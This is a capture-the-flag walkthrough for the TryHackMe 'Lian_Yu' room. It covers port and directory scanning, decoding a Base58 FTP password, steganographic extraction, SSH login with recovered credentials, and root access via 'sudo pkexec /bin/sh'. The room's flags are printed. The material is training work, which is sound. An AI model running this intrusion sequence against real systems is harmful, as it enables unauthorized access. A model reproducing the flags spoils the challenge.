# Lian\_Yu

<div align="left"><figure><img src="../.gitbook/assets/image (184).png" alt="" width="375"><figcaption><p><a href="https://tryhackme.com/room/lianyu">https://tryhackme.com/room/lianyu</a></p></figcaption></figure></div>

🔗 [Lian\_Yu](https://tryhackme.com/room/lianyu)

### Task 1 - Deploy the machine

🎯 Target IP: `10.10.95.230`

Create a directory for machine on the Desktop and a directory containing the scans with nmap.

### Task 2 - Reconnaissance

<pre class="language-bash"><code class="lang-bash">su
echo "10.10.95.230 lian_yu.thm" >> /etc/hosts

mkdir thm/lian_yu
cd thm/lian_yu
mkdir {nmap,content,exploits,scripts}

# At the end of the room
# To clean up the last line from the /etc/hosts file
<strong>sed -i '$ d' /etc/hosts
</strong></code></pre>

I prefer to start recon by pinging the target, this allows us to check connectivity and get OS info.

```bash
ping -c 3 lian_yu.thm
PING lian_yu.thm (10.10.95.230) 56(84) bytes of data.
64 bytes from lian_yu.thm (10.10.95.230): icmp_seq=1 ttl=63 time=66.7 ms
64 bytes from lian_yu.thm (10.10.95.230): icmp_seq=2 ttl=63 time=62.1 ms
64 bytes from lian_yu.thm (10.10.95.230): icmp_seq=3 ttl=63 time=62.6 ms
```

Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target is a \*nix, while Windows systems usually have a TTL of 128 secs.

Of course, start to check information scanning open ports:

```bash
nmap --open -p0- -n -Pn -vvv --min-rate 5000 lian_yu.thm -oG nmap/port_scan
```

```bash
PORT      STATE SERVICE REASON
21/tcp    open  ftp     syn-ack ttl 63
22/tcp    open  ssh     syn-ack ttl 63
80/tcp    open  http    syn-ack ttl 63
111/tcp   open  rpcbind syn-ack ttl 63
52286/tcp open  unknown syn-ack ttl 63
```

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sudo</td><td>run as root</td></tr><tr><td>sC</td><td>run default scripts</td></tr><tr><td>sV</td><td>enumerate versions</td></tr><tr><td>A</td><td>aggressive mode</td></tr><tr><td>T4</td><td>run a bit faster</td></tr><tr><td>oN</td><td>output to file with nmap formatting</td></tr></tbody></table>

It looks like there are 5 open ports on the machine: 21,22,80,111,52286.

Now, we need to search which services are running on open ports:

```bash
nmap -p21,22,80,111,52286 -n -Pn -vvv -sCV --min-rate 5000 lian_yu.thm -oN nmap/open_port
```

```bash
PORT      STATE SERVICE REASON         VERSION
21/tcp    open  ftp     syn-ack ttl 63 vsftpd 3.0.2
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAOZ67Cx0AtDwHfVa7iZw6O6htGa3GHwfRFSIUYW64PLpGRAdQ734COrod9T+pyjAdKscqLbUAM7xhSFpHFFGM7NuOwV+d35X8CTUM882eJX+t3vhEg9d7ckCzNuPnQSpeUpLuistGpaP0HqWTYjEncvDC0XMYByf7gbqWWU2pe9HAAAAFQDWZIJ944u1Lf3PqYCVsW48Gm9qCQAAAIBfWJeKF4FWRqZzPzquCMl6Zs/y8od6NhVfJyWfi8APYVzR0FR05YCdS2OY4C54/tI5s6i4Tfpah2k+fnkLzX74fONcAEqseZDOffn5bxS+nJtCWpahpMdkDzz692P6ffDjlSDLNAPn0mrJuUxBFw52Rv+hNBPR7SKclKOiZ86HnQAAAIAfWtiPHue0Q0J7pZbLeO8wZ9XNoxgSEPSNeTNixRorlfZBdclDDJcNfYkLXyvQEKq08S1rZ6eTqeWOD4zGLq9i1A+HxIfuxwoYp0zPodj3Hz0WwsIB2UzpyO4O0HiU6rvQbWnKmUaH2HbGtqJhYuPr76XxZtwK4qAeFKwyo87kzg==
|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRbgwcqyXJ24ulmT32kAKmPww+oXR6ZxoLeKrtdmyoRfhPTpCXdocoj0SqjsETI8H0pR0OVDQDMP6lnrL8zj2u1yFdp5/bDtgOnzfd+70Rul+G7Ch0uzextmZh7756/VrqKn+rdEVWTqqRkoUmI0T4eWxrOdN2vzERcvobqKP7BDUm/YiietIEK4VmRM84k9ebCyP67d7PSRCGVHS218Z56Z+EfuCAfvMe0hxtrbHlb+VYr1ACjUmGIPHyNeDf2430rgu5KdoeVrykrbn8J64c5wRZST7IHWoygv5j9ini+VzDhXal1H7l/HkQJKw9NSUJXOtLjWKlU4l+/xEkXPxZ
|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPfrP3xY5XGfIk2+e/xpHMTfLRyEjlDPMbA5FLuasDzVbI91sFHWxwY6fRD53n1eRITPYS1J6cBf+QRtxvjnqRg=
|   256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDexCVa97Otgeg9fCD4RSvrNyB8JhRKfzBrzUMe3E/Fn
80/tcp    open  http    syn-ack ttl 63 Apache httpd
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Purgatory
|_http-server-header: Apache
111/tcp   open  rpcbind syn-ack ttl 63 2-4 (RPC #100000)
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
52286/tcp open  status  syn-ack ttl 63 1 (RPC #100024)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### Task 3 - Find the flags

### 3.1 What is the Web Directory you found?

Then we can start to see website (port 80):

<div align="left"><figure><img src="../.gitbook/assets/image (187).png" alt=""><figcaption></figcaption></figure></div>

We find this info in the footer of website:

> Note: Hi Everyone, I am a huge fan to Arrowverse, I built this vm concept based on Arrow (first season) you will find a few things similar here and I posted this Content here just to entertain you, To complete this CTF it isn't mandatory to have knowledge on Arrrowverse series. I hope you will Enjoy the content and have fun :).

We continue exploring web source code to find eventual information disclosure.

<figure><img src="../.gitbook/assets/image (186).png" alt=""><figcaption></figcaption></figure>

No other informations, another good thing to do, is find hidden paths on website using gobuster

```bash
gobuster dir -u lian_yu.thm -w /usr/share/wordlists/dirb/common.txt
```

<div align="left"><figure><img src="../.gitbook/assets/image (188).png" alt=""><figcaption></figcaption></figure></div>

Very bad, we find only index page that we've just see.

We can try to use a bigger wordlist such as directory-list-2.3-medium.txt

```bash
gobuster dir -u lian_yu.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

<div align="left"><figure><img src="../.gitbook/assets/image (195).png" alt=""><figcaption></figcaption></figure></div>

Excellent! We find a new web path: /island, search it!

<figure><img src="../.gitbook/assets/image (190).png" alt=""><figcaption></figcaption></figure>

Note this code word: _vigilante._

We can try to retake another dirbuster search starting with island/ web path:

```bash
gobuster dir -u lian_yu.thm/island/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

<div align="left"><figure><img src="../.gitbook/assets/image (83) (1).png" alt=""><figcaption></figcaption></figure></div>

Then, we can answer at first question.

{% hint style="info" %}
2100
{% endhint %}

### 3.2 What is the file name you found?

Explore /2100 web page:

<figure><img src="../.gitbook/assets/image (191).png" alt=""><figcaption></figcaption></figure>

Viewing source code:

<div align="left"><figure><img src="../.gitbook/assets/image (197).png" alt=""><figcaption></figcaption></figure></div>

we see this info:

> you can avail your .ticket here but how?

Retaking another dirbuster search starting with 2100/ web path, we see that there're nothing, then we can try to custom dirbuster search using .ticket extension:

```bash
gobuster dir -u lian_yu.thm/island/2100/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .ticket
```

<figure><img src="../.gitbook/assets/image (85) (1).png" alt=""><figcaption></figcaption></figure>

Wow, we've the path to the ticket which is the answer to this question as well.

{% hint style="info" %}
green\_arrow.ticket
{% endhint %}

### 3.3 - What is the FTP Password?



Open it we see this potential encrypted word, then we can use CyberChef to decrypt it.

<figure><img src="../.gitbook/assets/image (84) (1).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://gchq.github.io/CyberChef/" %}

After multiple trial and error attempts, we can determine that this is a Base58 encoding.

<div align="left"><figure><img src="../.gitbook/assets/image (86) (1).png" alt=""><figcaption></figcaption></figure></div>

Remember that we've a potential username: 'vigilante', then we try to login with ftp:

<div align="left"><figure><img src="../.gitbook/assets/image (87) (1).png" alt=""><figcaption></figcaption></figure></div>

Download these resources using `mget *` command.

<div align="left"><figure><img src="../.gitbook/assets/image (89) (1).png" alt=""><figcaption></figcaption></figure></div>

There're three images with potential hidden info inside.

The 'Leave\_me\_alone.png' image is corrupt, seeing header we see that's not '.png':

```bash
xxd Leave_me_alone.png | head
```

<div align="left"><figure><img src="../.gitbook/assets/image (92) (1).png" alt=""><figcaption></figcaption></figure></div>

then we can modify it using hexeditor and display it, getting information about psw:

```bash
hexeditor Leave_me_alone.png 
```

<figure><img src="../.gitbook/assets/image (91) (1).png" alt=""><figcaption></figcaption></figure>

Perfect, we can try to extract info using steghide tool and psw retrevied few time ago:

```bash
steghide extract -sf aa.jpg
```

<div align="left"><figure><img src="../.gitbook/assets/image (93) (1).png" alt=""><figcaption></figcaption></figure></div>

```bash
unzip ss.zip
#we find two files
```

<div align="left"><figure><img src="../.gitbook/assets/image (75) (1).png" alt=""><figcaption></figcaption></figure></div>

The content of shado file can be more interesting!

{% hint style="info" %}
!#th3h00d
{% endhint %}

### 3.4 - What is the file name with SSH password?

Trying the same FTP credentials we can't access with SSH.

Then, we've try to use the same username and brute force psw using Hydra, but it doesn't work.

First to brute force user and psw, we can try to re-access with FTP and check home folder of system users:

<div align="left"><figure><img src="../.gitbook/assets/image (90) (1).png" alt=""><figcaption></figcaption></figure></div>

Very good, we find another user: slade, and probably ssh psw matched into shado file (M3tahuman).

Try it!

```bash
ssh slade@10.10.244.228
```

<div align="left"><figure><img src="../.gitbook/assets/image (76) (1).png" alt=""><figcaption></figcaption></figure></div>

Well done!\


{% hint style="info" %}
shado
{% endhint %}

### 3.5 - Find user.txt flag

Using find command we can search quickly user flag and open it with cat:

```bash
find / -type f -iname "user.txt" 2>/dev/null
```

<div align="left"><figure><img src="../.gitbook/assets/image (79) (1).png" alt=""><figcaption></figcaption></figure></div>

<details>

<summary>🚩User Flag (user.txt)</summary>

THM{P30P7E\_K33P\_53CRET5\_\_C0MPUT3R5\_D0N'T}

</details>

### 3.5 - Find root.txt flag

We can do `sudo -l` command to discover user's permissions.

<div align="left"><figure><img src="../.gitbook/assets/image (81) (1).png" alt=""><figcaption></figcaption></figure></div>

Very good pkexec has root permission!

Search on GTFOBins ([https://gtfobins.github.io/](https://gtfobins.github.io/)) and find our exploit:

<figure><img src="../.gitbook/assets/image (80) (1).png" alt=""><figcaption><p><a href="https://gtfobins.github.io/gtfobins/pkexec/">https://gtfobins.github.io/gtfobins/pkexec/</a></p></figcaption></figure>

Run it to became root and find flag (how the last task):

```bash
sudo pkexec /bin/sh #privilege escalation

/bin/bash -i #spawn shell
find / -type f -iname "root.txt" 2>/dev/null #find root flag
cat /root/root.txt #see root.txt
```

<div align="left"><figure><img src="../.gitbook/assets/image (82) (1).png" alt=""><figcaption></figcaption></figure></div>

<details>

<summary>🚩 Root Flag (root.txt)</summary>

THM{MY\_W0RD\_I5\_MY\_B0ND\_IF\_I\_ACC3PT\_YOUR\_CONTRACT\_THEN\_IT\_WILL\_BE\_COMPL3TED\_OR\_I'LL\_BE\_D34D}

</details>
